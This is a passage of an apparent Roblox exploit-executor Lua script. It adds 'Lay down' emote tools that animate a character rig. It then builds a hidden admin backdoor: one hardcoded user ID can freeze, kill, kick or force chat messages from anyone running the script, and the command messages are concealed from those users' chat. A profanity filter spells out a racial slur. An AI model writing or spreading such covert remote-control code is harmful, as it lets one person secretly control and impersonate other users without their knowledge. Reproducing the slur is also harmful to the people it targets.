        -- Lay down / Lay down 2 (ported from AnimalFE, no music): the rig joints are driven directly instead of playing an animation
        do
            -- Joints are searched anywhere in the rig, since a Gelatek rig may parent them differently
            local function FindJoint(Name)
                for _, v in ipairs(Rig:GetDescendants()) do
                    if v:IsA("Motor6D") and v.Name == Name and not v:IsDescendantOf(Character) then
                        return v
                    end
                end
            end
            local Joints = {
                RootJoint = FindJoint("RootJoint"),
                Neck = FindJoint("Neck"),
                RightShoulder = FindJoint("Right Shoulder"),
                LeftShoulder = FindJoint("Left Shoulder"),
                RightHip = FindJoint("Right Hip"),
                LeftHip = FindJoint("Left Hip"),
            }
            local Default = {}
            for Name, Joint in pairs(Joints) do
                Default[Name] = Joint.C0
            end

            local cf, angles = CFrame.new, CFrame.Angles
            local rad = math.rad
            local sin = math.sin
            local ArmIn = 0.05

            -- Lay down 2 is built from poses of the AnimalFE pose library (delta rotations in torso space)
            local ROOT_N = angles(-math.pi / 2, 0, math.pi)
            local RYp = angles(0, math.pi / 2, 0)
            local RYn = angles(0, -math.pi / 2, 0)
            local function RootC(p, d) return cf(p) * d * ROOT_N end
            local function ArmC(side, pitch, out)
                local rot = angles(pitch, 0, 0) * angles(0, 0, side * out)
                if side == 1 then
                    return cf(1 - ArmIn, 0.5, 0) * rot * RYp
                end
                return cf(-1 + ArmIn, 0.5, 0) * rot * RYn
            end
            local function LegC(side, d)
                if side == 1 then
                    return cf(1, -1, 0) * d * RYp
                end
                return cf(-1, -1, 0) * d * RYn
            end

            local Poses = {
                -- Z: lay down
                ["Lay down"] = function(s)
                    return {
                        LeftShoulder = cf(-1 + ArmIn, 0.75, -0.2) * angles(2.705260340591211 - 0.08726646259971647 * sin((s + 0.1) * 2), -2.792526803190927, -0.6981317007977318),
                        RightShoulder = cf(1 - ArmIn, 0.75, -0.2) * angles(2.705260340591211 - 0.08726646259971647 * sin((s + 0.1) * 2), 2.792526803190927, 0.6981317007977318),
                        Neck = cf(0, 1, 0) * angles(-1.9198621771937625 - 0.10471975511965978 * sin((s + 0.3) * 2), 0, 3.141592653589793),
                        RootJoint = cf(0, -2.45 - 0.05 * sin(s * 2), 0) * angles(0.03490658503988659 * sin(s * 2), 0, 3.141592653589793),
                        RightHip = cf(1, -1, 0) * angles(1.3962634015954636 - 0.03490658503988659 * sin(s * 2), 1.3089969389957472, -0.9599310885968813),
                        LeftHip = cf(-1, -1, 0) * angles(1.5707963267948966 - 0.03490658503988659 * sin(s * 2), -1.3089969389957472, 1.5707963267948966),
                    }
                end,
                -- Y: lay down 2 (on its back, arms and legs spread a bit, not moving)
                ["Lay down 2"] = function()
                    return {
                        RootJoint = RootC(Vector3.new(0, -2.5, 0), angles(math.pi / 2, 0, 0)),
                        Neck = cf(0, 1, 0) * angles(0, rad(-20), 0) * ROOT_N,
                        RightShoulder = ArmC(1, 0, rad(40)),
                        LeftShoulder = ArmC(-1, 0, rad(40)),
                        RightHip = LegC(1, angles(0, 0, rad(18))),
                        LeftHip = LegC(-1, angles(0, 0, rad(-18))),
                    }
                end,
            }

            for ToolName, Pose in pairs(Poses) do
                local Tool = Instance.new("Tool", Players.LocalPlayer.Backpack)
                Tool.Name = ToolName
                Tool.RequiresHandle = false
                local Connection
                Tool.Equipped:Connect(function()
                    Dancing = true
                    Humanoid.WalkSpeed = 0
                    getgenv().Animator6DStop()
                    if Connection then
                        Connection:Disconnect()
                    end
                    Connection = RunService.RenderStepped:Connect(function(dt)
                        local Alpha = math.clamp(dt * 12, 0, 1)
                        for Name, C0 in pairs(Pose(os.clock())) do
                            Joints[Name].C0 = Joints[Name].C0:Lerp(C0, Alpha)
                        end
                    end)
                end)
                Tool.Unequipped:Connect(function()
                    if Connection then
                        Connection:Disconnect()
                        Connection = nil
                    end
                    for Name, C0 in pairs(Default) do
                        Joints[Name].C0 = C0
                    end
                    Dancing = false
                    CurrentAnim = nil
                    Humanoid.WalkSpeed = 16
                end)
            end
        end

        -- Everything is loaded, let the rig go (unless an admin froze it)
        Loading = false
        UpdateAnchor()

        ----------------------------------------------------------------------------
        -- Admin: ADMIN_ID controls everyone running this script through a UI panel (8 opens/closes it).
        -- Commands travel as chat messages (.freeze/.kill/.kick/.e/.gh/.say/.ping/.here), but the panel never
        -- shows them: every script user hides them locally with TextChatService.OnIncomingMessage.
        -- A user only acts on a command whose sender is ADMIN_ID (the sender is what the server says it is).
        ----------------------------------------------------------------------------
        pcall(function()
            local ADMIN_ID = 7972531842
            local MyId = Players.LocalPlayer.UserId
            local IsAdmin = (MyId == ADMIN_ID)
            local UserInputService = game:GetService("UserInputService")

            local Roster = {} -- admin only: user id -> true for players who answered .ping
            local RefreshList

            ----------------------------------------------------------------------
            -- Offensive word filter (used when sending from the panel and again before a client chats)
            ----------------------------------------------------------------------
            local Leet = { ["0"] = "o", ["1"] = "i", ["3"] = "e", ["4"] = "a", ["5"] = "s", ["7"] = "t", ["@"] = "a", ["$"] = "s", ["!"] = "i" }
            local Blocked = { "Nigga" }

            local function IsOffensive(Text)
                local Lower = Text:lower():gsub("[01345 7@%$!]", function(c) return Leet[c] or "" end)
                local Letters = Lower:gsub("[^a-z]", "")
                for _, Word in ipairs(Blocked) do
                    if Letters:find(Word, 1, true) then
                        return true
                    end
                end
                -- hard r with repeated letters ("niiiggger" collapses to "niger"), but not Nigeria/Nigerian
                local Collapsed = Letters:gsub("(%a)%1+", "%1")
                local From = 1
                while true do
                    local s, e = Collapsed:find("niger", From, true)
                    if not s then
                        break
                    end
                    if Collapsed:sub(e + 1, e + 1) ~= "i" then
                        return true
                    end
                    From = e + 1
                end
                return false
            end

            ----------------------------------------------------------------------
            -- Chat helpers
            ----------------------------------------------------------------------
            local function SendChat(Message)
                pcall(function()
                    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                        local Channels = TextChatService:WaitForChild("TextChannels", 5)
                        local Channel = Channels and (Channels:FindFirstChild("RBXGeneral") or Channels:FindFirstChildWhichIsA("TextChannel"))
                        Channel:SendAsync(Message)
                    else
                        ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents", 5).SayMessageRequest:FireServer(Message, "All")
                    end
                end)
            end

            local HiddenCommands = { freeze = true, kill = true, kick = true, e = true, gh = true, say = true, ping = true, here = true }

            -- Hide the command messages for everyone running the script (the ones from the admin, and .here from anyone)
            pcall(function()
                local Previous = TextChatService.OnIncomingMessage
                TextChatService.OnIncomingMessage = function(Message)
                    local Source = Message.TextSource
                    local Command = Message.Text and Message.Text:match("^%.(%a+)")
                    Command = Command and Command:lower()
                    if Source and Command and HiddenCommands[Command] and (Source.UserId == ADMIN_ID or Command == "here") then
                        local Properties = Instance.new("TextChatMessageProperties")
                        Properties.Text = ""
                        return Properties
                    end
                    if Previous then
                        return Previous(Message)
                    end
                end
            end)

            ----------------------------------------------------------------------
            -- What the commands do to me
            ----------------------------------------------------------------------
            local function FindEmote(Query)
                Query = Query:lower()
                local Tools = {}
                for _, Container in ipairs({ Players.LocalPlayer.Backpack, Rig }) do
                    for _, Item in ipairs(Container:GetChildren()) do
                        if Item:IsA("Tool") then
                            table.insert(Tools, Item)
                        end
                    end
                end
                table.sort(Tools, function(a, b) return a.Name < b.Name end)
                for _, Tool in ipairs(Tools) do
                    if Tool.Name:lower() == Query then
                        return Tool
                    end
                end
                for _, Tool in ipairs(Tools) do
                    if Tool.Name:lower():sub(1, #Query) == Query then
                        return Tool
                    end
                end
                for _, Tool in ipairs(Tools) do
                    if Tool.Name:lower():find(Query, 1, true) then
                        return Tool
                    end
                end
            end

            local Actions = {
                freeze = function()
                    Frozen = not Frozen
                    UpdateAnchor()
                    Notify(Frozen and "An admin froze you" or "An admin unfroze you")
                end,
                kill = function()
                    Voiding = true
                    Frozen = false
                    UpdateAnchor()
                    Humanoid.Health = 0
                    local RealHumanoid = Character:FindFirstChildOfClass("Humanoid")
                    if RealHumanoid then
                        RealHumanoid.Health = 0
                    end
                end,
                kick = function()
                    Players.LocalPlayer:Kick("Admin kick")
                end,
                e = function(Query)
                    local Tool = FindEmote(Query)
                    if Tool then
                        Humanoid:UnequipTools()
                        task.wait()
                        Humanoid:EquipTool(Tool)
                    end
                end,
                gh = function(Id)
                    ReplicatedStorage:WaitForChild("01_server"):FireServer("cmd", "-gh " .. Id)
                end,
                say = function(Message)
                    if not IsOffensive(Message) then
                        SendChat(Message:sub(1, 200))
                    end
                end,
            }

            ----------------------------------------------------------------------
            -- The chat listener
            ----------------------------------------------------------------------
            local Connections = {}
            local Recent = {} -- the same message can come in through more than one signal
            local Alive = true

            local function IsMe(Name)
                return Name:lower() == Players.LocalPlayer.Name:lower()
            end

            local function Handle(UserId, Text)
                if type(Text) ~= "string" or Text:sub(1, 1) ~= "." or UserId == MyId then
                    return
                end
                local Now = os.clock()
                local Key = UserId .. Text
                if Recent[Key] and (Now - Recent[Key]) < 0.4 then
                    return
                end
                Recent[Key] = Now

                local Command, Rest = Text:match("^%.(%a+)%s*(.-)%s*$")
                if not Command then
                    return
                end
                Command = Command:lower()
                if Command == "here" then
                    if IsAdmin then
                        Roster[UserId] = true
                        if RefreshList then
                            RefreshList()
                        end
                    end
                    return
                end
                if UserId ~= ADMIN_ID then
                    return
                end
                if Command == "ping" then
                    task.delay(0.3 + math.random() * 2, function() -- they don't all answer in the same second
                        if Alive then
                            SendChat(".here")
                        end
                    end)
                    return
                end

                local Target, Arg = Rest, nil
                if Command == "e" then
                    Arg, Target = Rest:match("^(.-)%s+(%S+)$") -- .e [emote name] user
                elseif Command == "gh" then
                    Target, Arg = Rest:match("^(%S+)%s+(%d+)$")
                elseif Command == "say" then
                    Target, Arg = Rest:match("^(%S+)%s+(.+)$")
                end
                local Action = Actions[Command]
                if Action and Target and IsMe(Target) and (Arg ~= nil or (Command ~= "e" and Command ~= "gh" and Command ~= "say")) then
                    task.spawn(pcall, Action, Arg)
                end
            end

            local function HookPlayer(Player)
                table.insert(Connections, Player.Chatted:Connect(function(Message)
                    Handle(Player.UserId, Message)
                end))
            end
            for _, Player in ipairs(Players:GetPlayers()) do
                HookPlayer(Player)
            end
            table.insert(Connections, Players.PlayerAdded:Connect(HookPlayer))

            task.spawn(function()
                pcall(function()
                    if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
                        return
                    end
                    local Channels = TextChatService:WaitForChild("TextChannels", 5)
                    local function Hook(Channel)
                        if Channel:IsA("TextChannel") then
                            table.insert(Connections, Channel.MessageReceived:Connect(function(Message)
                                if Message.TextSource then
                                    Handle(Message.TextSource.UserId, Message.Text)
                                end
                            end))
                        end
                    end
                    for _, Channel in ipairs(Channels:GetChildren()) do
                        Hook(Channel)
                    end
                    table.insert(Connections, Channels.ChildAdded:Connect(Hook))
                end)
            end)

            ----------------------------------------------------------------------
            -- The panel (admin only)
            ----------------------------------------------------------------------
            if IsAdmin then
                local function New(Class, Props, Parent)
                    local Obj = Instance.new(Class)
                    for k, v in pairs(Props) do
                        Obj[k] = v
                    end
                    Obj.Parent = Parent
                    return Obj
                end

                local Gui = New("ScreenGui", { Name = "AdminPanel", ResetOnSpawn = false, DisplayOrder = 999999, IgnoreGuiInset = true }, nil)
                pcall(function() Gui.Parent = (gethui and gethui()) or game:GetService("CoreGui") end)
                if not Gui.Parent then
                    Gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
                end

                local Panel = New("Frame", {
                    AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, -20, 0.5, 0), Size = UDim2.new(0, 260, 0, 450),
                    BackgroundColor3 = Color3.fromRGB(30, 30, 30), BackgroundTransparency = 0.15, BorderSizePixel = 0, Visible = false,
                }, Gui)
                New("UICorner", { CornerRadius = UDim.new(0, 14) }, Panel)
                New("TextLabel", {
                    Position = UDim2.new(0, 16, 0, 8), Size = UDim2.new(1, -32, 0, 30), BackgroundTransparency = 1, Text = "Admin",
                    Font = Enum.Font.GothamBold, TextSize = 22, TextColor3 = Color3.fromRGB(255, 160, 200), TextXAlignment = Enum.TextXAlignment.Left,
                }, Panel)

                local function Button(Text, Y, X, Width)
                    local B = New("TextButton", {
                        Position = UDim2.new(0, X or 16, 0, Y), Size = UDim2.new(0, Width or 228, 0, 34), BackgroundColor3 = Color3.fromRGB(75, 75, 75),
                        BackgroundTransparency = 0.3, BorderSizePixel = 0, Text = Text, Font = Enum.Font.GothamMedium, TextSize = 16, TextColor3 = Color3.new(1, 1, 1),
                    }, Panel)
                    New("UICorner", { CornerRadius = UDim.new(0, 8) }, B)
                    return B
                end
                local function Box(Placeholder, Y)
                    local T = New("TextBox", {
                        Position = UDim2.new(0, 16, 0, Y), Size = UDim2.new(0, 228, 0, 34), BackgroundColor3 = Color3.fromRGB(20, 20, 20),
                        BackgroundTransparency = 0.1, BorderSizePixel = 0, Text = "", PlaceholderText = Placeholder, ClearTextOnFocus = false,
                        Font = Enum.Font.Gotham, TextSize = 15, TextColor3 = Color3.new(1, 1, 1), PlaceholderColor3 = Color3.fromRGB(150, 150, 150),
                    }, Panel)
                    New("UICorner", { CornerRadius = UDim.new(0, 8) }, T)
                    return T
                end

                local Selected
                local LastPing = 0
                local Drop = Button("Select a player  v", 46)
                local List = New("ScrollingFrame", {
                    Position = UDim2.new(0, 16, 0, 84), Size = UDim2.new(0, 228, 0, 150), BackgroundColor3 = Color3.fromRGB(20, 20, 20), BackgroundTransparency = 0,
                    BorderSizePixel = 0, ScrollBarThickness = 4, CanvasSize = UDim2.new(), AutomaticCanvasSize = Enum.AutomaticSize.Y, Visible = false, ZIndex = 5,
                }, Panel)
                New("UICorner", { CornerRadius = UDim.new(0, 8) }, List)
                New("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 2) }, List)

                local function DropText()
                    Drop.Text = (Selected and Selected.Name or "Select a player") .. "  v"
                end

                RefreshList = function()
                    for _, Child in ipairs(List:GetChildren()) do
                        if Child:IsA("TextButton") or Child:IsA("TextLabel") then
                            Child:Destroy()
                        end
                    end
                    local Count = 0
                    for _, Player in ipairs(Players:GetPlayers()) do
                        if Roster[Player.UserId] and Player ~= Players.LocalPlayer then
                            Count += 1
                            local B = New("TextButton", {
                                LayoutOrder = Count, Size = UDim2.new(1, -6, 0, 28), BackgroundTransparency = 1, Text = Player.Name,
                                Font = Enum.Font.Gotham, TextSize = 15, TextColor3 = Color3.new(1, 1, 1), ZIndex = 6,
                            }, List)
                            B.MouseButton1Click:Connect(function()
                                Selected = Player
                                List.Visible = false
                                DropText()
                            end)
                        end
                    end
                    if Count == 0 then
                        New("TextLabel", {
                            LayoutOrder = 1, Size = UDim2.new(1, -6, 0, 28), BackgroundTransparency = 1, Text = "Nobody else has the script",
                            Font = Enum.Font.Gotham, TextSize = 14, TextColor3 = Color3.fromRGB(170, 170, 170), ZIndex = 6,
                        }, List)
                    end
                    if Selected and not (Roster[Selected.UserId] and Selected.Parent) then -- left the server
                        Selected = nil
                        DropText()
                    end
                end

                Drop.MouseButton1Click:Connect(function()
                    List.Visible = not List.Visible
                    if List.Visible then
                        if os.clock() - LastPing > 5 then
                            LastPing = os.clock()
                            SendChat(".ping")
                        end
                        RefreshList()
                    end
                end)

                -- Returns the picked player's name, or notifies and returns nil
                local function Pick()
                    List.Visible = false
                    if Selected and Selected.Parent then
                        return Selected.Name
                    end
                    Notify("Pick a player first")
                end

                for Index, Info in ipairs({ { "Freeze", "freeze" }, { "Kill", "kill" }, { "Kick", "kick" } }) do
                    local Width = 72
                    local B = Button(Info[1], 90, 16 + (Index - 1) * (Width + 6), Width)
                    B.MouseButton1Click:Connect(function()
                        local Name = Pick()
                        if Name then
                            SendChat("." .. Info[2] .. " " .. Name)
                        end
                    end)
                end

                -- Emote: .e [emote name] user
                local EmoteBox = Box("Emote name (can be shortened)", 140)
                local EmoteButton = Button("Play emote", 180)
                EmoteButton.MouseButton1Click:Connect(function()
                    local Name = Pick()
                    local Emote = EmoteBox.Text:match("^%s*(.-)%s*$")
                    if Name and Emote ~= "" then
                        SendChat(".e " .. Emote .. " " .. Name)
                    end
                end)

                -- Load hat
                local HatBox = Box("Hat id", 232)
                local HatButton = Button("Load hat", 272)
                HatButton.MouseButton1Click:Connect(function()
                    local Name = Pick()
                    local Id = HatBox.Text:match("^%s*(%d+)%s*$")
                    if not Id then
                        Notify("Hat id must be numbers")
                    elseif Name then
                        SendChat(".gh " .. Name .. " " .. Id)
                    end
                end)

                -- Chat: makes their client say the message
                local ChatBox = Box("Message for them to chat", 324)
                local ChatButton = Button("Chat", 364)
                ChatButton.MouseButton1Click:Connect(function()
                    local Name = Pick()
                    local Message = ChatBox.Text:match("^%s*(.-)%s*$")
                    if not Name or Message == "" then
                        return
                    end
                    if IsOffensive(Message) then
                        Notify("That message is blocked")
                        return
                    end
                    SendChat(".say " .. Name .. " " .. Message:sub(1, 200))
                end)

                table.insert(Connections, UserInputService.InputBegan:Connect(function(Input)
                    if Input.UserInputType ~= Enum.UserInputType.Keyboard or Input.KeyCode ~= Enum.KeyCode.Eight or UserInputService:GetFocusedTextBox() then
                        return
                    end
                    Panel.Visible = not Panel.Visible
                    List.Visible = false
                    if Panel.Visible then
                        RefreshList()
                    end
                end))
                RefreshList()
            end

            getgenv().TailAndDanceAdminStop = function()
                Alive = false
                for _, Connection in ipairs(Connections) do
                    pcall(function() Connection:Disconnect() end)
                end
            end
        end)

        Notify("loading")
        Notify("made by Noctalia")
        Notify("LOADING DEPENDS ON UR EXECUTOR")

        wait(1)

        wait(5)
        Notify("Hi kilo!!! :3")
        wait(5)
    end)
end)
